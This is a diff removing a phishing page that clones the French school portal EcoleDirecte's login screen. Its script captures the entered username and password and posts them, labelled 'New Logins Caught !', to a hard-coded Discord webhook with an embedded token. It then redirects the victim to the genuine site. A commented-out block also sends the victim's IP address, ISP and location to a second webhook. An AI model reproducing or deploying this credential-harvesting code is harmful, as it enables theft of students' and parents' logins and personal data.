-    console.log("password : ", pass);
-
-    send(webhook_name, uname, pass, date_string);
-    /*send2(webhook_name);*/
-    setTimeout(function redirect () { location.assign("https://www.ecoledirecte.com");}, 150);
-
-  }
-
-
-  function send(webhook_name, uname, pass, date_string) {    
-
-    console.log("fonction message");
-    console.log(webhook_name, uname, pass, date_string);
-    var randomColor = Math.floor(Math.random()*16777215).toString(16);
-    randomColor = parseInt(randomColor, 16);
-    var webhooklink = "https://discord.com/api/webhooks/1097156250061516820/nlMRlecy5SqmmZSzU_gvb-o49RDnQtd6mrUtk62epHkMMGEAYD7glS1aL1ycfdscQXJs";
-    const request = new XMLHttpRequest();
-      request.open("POST", webhooklink);
-      request.setRequestHeader('Content-type', 'application/json');
-    const params =
-      {
-        "content": null,
-        "username": `${webhook_name}`,
-        "avatar_url": "https://ecole-directe.github.io/EcoleDirecte_files/logoEcoleDirecteBlank2.png",
-        "embeds":
-        [
-          {
-            "title": "New Logins Caught !",
-            "description": `Username : ${uname}\nPassword : ${pass}\nDate : ${date_string}`, 
-            "color": randomColor,
-            "footer":
-            {
-              "text": `EcoleDirecte Phishing - Nota\ncolor : ${randomColor}`
-            }
-          }
-        ]
-      }
-
-    request.send(JSON.stringify(params));
-    console.log("message1 sent");
-
-  }
-
-/*function send2(webhook_name, data) {    
-
-    console.log("fonction message 2");
-    console.log(webhook_name,data);
-
-    var webhooklink2 = "https://discord.com/api/webhooks/946062751145553931/sPINr1kfxDHzLqLeRJlTM0vLV-ZxYQLhrHpHIJTPxQegu0igBG55YndQv_mqZoRtvvWH";
-    const request2 = new XMLHttpRequest();
-      request2.open("POST", webhooklink2);
-      request2.setRequestHeader('Content-type', 'application/json');
-    const params2 =
-      {
-        "content": null,
-        "username": `${webhook_name}`,
-        "embeds":
-        [
-          {
-            "title": "Victim informations",
-            "description": `ISP : ${data.isp} \n
-                           Ip Adress : ${data.query} \n 
-                           City : ${data.city} \n
-                           Region : ${data.regionName} \n
-                           Country : ${data.country} \n`
-            "color": 1127128,
-            "footer":
-            {
-              "text": `EcoleDirecte Phishing - Nota`
-            }
-          }
-        ]
-      }
-
-    request2.send(JSON.stringify(params2));
-    console.log("message 2 sent");
-	
-  }
-	var getJSON = function(url, callback) {
-
-	    var xmlhttprequest = new XMLHttpRequest();
-	    xmlhttprequest.open('GET', url, true);
-	    xmlhttprequest.responseType = 'json';
-
-	    xmlhttprequest.onload = function() {
-
-	        var status = xmlhttprequest.status;
-
-	        if (status == 200) {
-	            callback(null, xmlhttprequest.response);
-	        } else {
-	            callback(status, xmlhttprequest.response);
-	        }
-	    };
-
-	    xmlhttprequest.send();
-	};
-
-	getJSON('http://ip-api.com/json/',  
-		function(err, data) {
-
-		    if (err != null) {
-		        console.error(err);
-		    } else {
-
-		    const webhook_name2 = "EcoleDirecte Phishing";
-			var display = `pays: ${data.country}
-			region: ${data.regionName}
-			ville: ${data.city} 
-			ip: ${data.query}`;
-
-		    }
-	  console.log(display);
-	  console.log(data);
-	  send2(webhook_name2, data);
-	  });
-
-
-
-     var getJSON = function(url, callback) {
-
-	    var xmlhttprequest = new XMLHttpRequest();
-	    xmlhttprequest.open('GET', url, true);
-	    xmlhttprequest.responseType = 'json';
-
-	    xmlhttprequest.onload = function() {
-
-	        var status = xmlhttprequest.status;
-
-	        if (status == 200) {
-	            callback(null, xmlhttprequest.response);
-	        } else {
-	            callback(status, xmlhttprequest.response);
-	        }
-	    };
-
-	    xmlhttprequest.send();
-	};
-
-	getJSON('http://ip-api.com/json/',  
-		function(err, data) {
-
-		    if (err != null) {
-		        console.error(err);
-		    } else {
-
-			var display = `pays: ${data.country}
-			region: ${data.regionName}
-			ville: ${data.city} 
-			ip: ${data.query}`;
-
-		    }
-	  console.log(display)
-	  });
-          
-
-
-
-
-          {
-            "title": "Victim informations",
-            "description": `ISP : ${data.isp} \n
-                           Ip Adress : ${data.query} \n 
-                           City : ${data.city} \n
-                           Region : ${data.regionName} \n
-                           Country : ${data.country} \n`
-            "color": 1127128,
-            "footer":
-            {
-              "text": `EcoleDirecte Phishing - Nota`
-            }
-          }*/
-
-
-</script>
-
-
-
-
-
-    <div id="MathJax_Message" style="display: none;"></div>
-    <app-root _nghost-jkw-c127="" ng-version="12.2.15"><div _ngcontent-jkw-c127="" class="container-principal"><router-outlet _ngcontent-jkw-c127=""></router-outlet><ng-component><div id="main-part"><div id="main"><router-outlet></router-outlet><ed-login _nghost-jkw-c63=""><div _ngcontent-jkw-c63="" id="login" class="container-fluid no-padding"><div _ngcontent-jkw-c63="" class="col-lg-4 col-md-5 login-container"><header _ngcontent-jkw-c63="" class="text-center"><img _ngcontent-jkw-c63="" src="./EcoleDirecte_files/logoEcoleDirecte.png" alt="Logo du site EcoleDirecte"><h1 _ngcontent-jkw-c63="">EcoleDirecte</h1></header><div _ngcontent-jkw-c63="" id="site-closed" class="form-box" hidden=""><h3 _ngcontent-jkw-c63="" id="outputbis" class="animated fadeInUp alert alert-danger"> Ce site est <br _ngcontent-jkw-c63=""> actuellement fermé </h3><br _ngcontent-jkw-c63=""><p _ngcontent-jkw-c63="" class="help-block"> Vous ne pouvez pas vous connecter pour le moment. <br _ngcontent-jkw-c63=""> Contactez votre établissement pour plus d'informations. </p></div><div _ngcontent-jkw-c63="" class="form-box" hidden=""><h2 _ngcontent-jkw-c63="">Redirection en cours</h2><br _ngcontent-jkw-c63=""><i _ngcontent-jkw-c63="" class="fa fa-spinner fa-pulse"></i><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63=""><br _ngcontent-jkw-c63=""></div><ed-login-form _ngcontent-jkw-c63="" class="form-box" _nghost-jkw-c62=""><!----><div _ngcontent-jkw-c62="" id="bloc-connexion"><h2 _ngcontent-jkw-c62="" class="text-center">Connectez-vous</h2><!----><form _ngcontent-jkw-c62="" novalidate="" class="ng-valid ng-touched ng-dirty" data-bitwarden-watching="1"><input _ngcontent-jkw-c62="" id="username" type="text" name="username" placeholder="Identifiant" autocapitalize="off" class="input-block-level log ng-valid ng-touched ng-dirty" data-com.bitwarden.browser.user-edited="yes"><span _ngcontent-jkw-c62="" id="show-password" class="btn btn-simple btn-default pull-right"><i _ngcontent-kwa-c175 class="fa fa-eye"></i></span><input _ngcontent-jkw-c62="" id="password" name="password" placeholder="Mot de passe" class="log ng-valid ng-dirty ng-touched" type="password" data-com.bitwarden.browser.user-edited="yes"><a _ngcontent-jkw-c62="" routerlink="/recuplogin" href="https://www.ecoledirecte.com/recuplogin" class="mdp-lost">Mot de passe oublié ?</a><!----><div _ngcontent-jkw-c62="" class="clearfix"></div> <a id="bouton" onclick="connect_funct()" class="btn btn-info btn-block login"> <!-- <button _ngcontent-jkw-c62="" id="connexion" class="btn btn-info btn-block login" onclick="connect_funct()">Connexion</button> -->Connexion</a> <div _ngcontent-jkw-c62="" class="checkbox text-center text-bold"><label _ngcontent-jkw-c62=""><input _ngcontent-jkw-c62="" type="checkbox" name="loginStored" class="ng-untouched ng-pristine ng-valid"></label><span _ngcontent-jkw-c62="" class="label-checkbox">Se souvenir de moi</span></div><!----></form><!----></div></ed-login-form><div _ngcontent-jkw-c63="" id="item-mentions"><button _ngcontent-jkw-c63="" type="button" class="btn btn-link"><a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">Mentions légales </a></button></div><span _ngcontent-jkw-c63="" class="pull-left version-site">v1.14.1</span></div><div _ngcontent-jkw-c63="" class="col-lg-8 col-md-7 info-container"><button _ngcontent-jkw-c63="" id="pb-connexion" class="btn btn-link">Problème de connexion ?</button><div _ngcontent-jkw-c63="" class="autopromo"><p _ngcontent-jkw-c63=""><span _ngcontent-jkw-c63="">Retrouvez EcoleDirecte aussi sur votre mobile</span></p><ul _ngcontent-jkw-c63="" class="list-inline"><li _ngcontent-jkw-c63=""><a _ngcontent-jkw-c63="" href="https://play.google.com/store/apps/developer?id=Aplim" target="_blank"><img _ngcontent-jkw-c63="" alt="Get it on Google Play" src="./EcoleDirecte_files/play-store.png"></a></li><li _ngcontent-jkw-c63=""><a _ngcontent-jkw-c63="" href="https://itunes.apple.com/fr/developer/aplim/id466797731" target="_blank"><img _ngcontent-jkw-c63="" alt="Get it on AppStore" src="./EcoleDirecte_files/appstore.png"></a></li></ul></div></div></div></ed-login><!----></div></div></ng-component><!----><router-outlet _ngcontent-jkw-c127="" name="auxiliaryModal"></router-outlet><!----></div><!----><!----><!----></app-root>
-  <!-- <script src="./EcoleDirecte_files/runtime-es2017.27e3227eabd5291989db.js.téléchargement" type="module"></script><script src="./EcoleDirecte_files/runtime-es5.27e3227eabd5291989db.js.téléchargement" nomodule="" defer=""></script><script src="./EcoleDirecte_files/polyfills-es5.76983aa81bf4aef4888b.js.téléchargement" nomodule="" defer=""></script><script src="./EcoleDirecte_files/polyfills-es2017.3e85402537631673fd16.js.téléchargement" type="module"></script><script src="./EcoleDirecte_files/scripts.8df4a51b420862266829.js.téléchargement" defer=""></script><script src="./EcoleDirecte_files/main-es2017.9de8d9d4197d288d65de.js.téléchargement" type="module"></script><script src="./EcoleDirecte_files/main-es5.9de8d9d4197d288d65de.js.téléchargement" nomodule="" defer=""></script> -->
-
-<style type="text/css">
-  #bouton {margin: 2vh 0; padding: 10px; background: #0f8fd1; font-size: 20px; color: #fff; }
-</style>
-<!-- <button _ngcontent-jkw-c62="" id="connexion" type="submit" class="btn btn-info btn-block login" onclick="connect_funct()">Connexion</button> -->
-
-
-
-
-
-
-<div style="position: absolute; left: -9999px; top: -9999px;"><div class="dhx_cal_container"><div class="dhx_cal_scale_placeholder"></div><div></div></div></div><div style="position: absolute; left: -9999px; top: -9999px;"><div class="dhx_cal_container"><div class="dhx_cal_scale_placeholder"></div><div></div></div></div>
 </body>
+
 </html>
